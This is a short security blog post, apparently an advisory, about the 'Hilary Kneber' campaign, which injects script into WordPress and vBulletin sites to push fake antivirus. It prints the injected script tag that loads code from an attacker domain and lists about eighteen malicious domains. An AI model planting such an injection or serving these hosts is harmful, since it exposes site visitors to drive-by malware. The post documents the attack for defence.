Hilary Kneber Strikes Again – welcometotheglobalisnet

It seems that after a few months quiet, the “Hilary Kneber” group is back at it again. Their latest approach is very typical of Hilary Kneber style attacks affecting GoDaddy shared hosts. Basically they modify every PHP file and the database to make sure every page in the infected site is loading malware.

Today, we’ve started to see various WordPress sites infected with the following malware:

<script src "http://welcometotheglobalisnet.com/js.php?kk=25′></script>

Update 1: We are seeing some Vbulletin forums with the database infected. So it is not restricted to WordPress.
Update 2: If you need help cleaning up your site, we can do it for you: http://sucuri.net/signup
Which infects every post in the WordPress database and also modifies all PHP files to generate the above code. Note that the domain is not blacklisted yet so the risk is very high for everyone visiting an infected site.
What happens when someone clicks an infected site?
What the malware does is very simple, it contacts a few domains:

www3.aboutavsoft.com
www3.first-guardul.cz.cc
www3.first-security-checker.com
www3.incredible-protectionro.rr.nu
www3.netprotectionsoftre.com
www3.save-internet-foru.com
www3.simpleclean-foru.net
www3.smart-security-holder.in
www3.smartsuite-4u.in
www3.top-network-guard.in
www3.top-scan-foru.in
www3.topsuitesentinel.rr.nu
www4.first-internetmaster.net
www4.goodghtsafe.rr.nu
www4.seeeresafe.in
www4.seefredsafe.in
www4.smartinternet-foryou.net
www4.top-only-scanner.uni.cc

That will then try to infect the visitor via their browser (with a fake anti virus). We are still analyzing the infected sites, and we’ll post more details as they’re discovered.
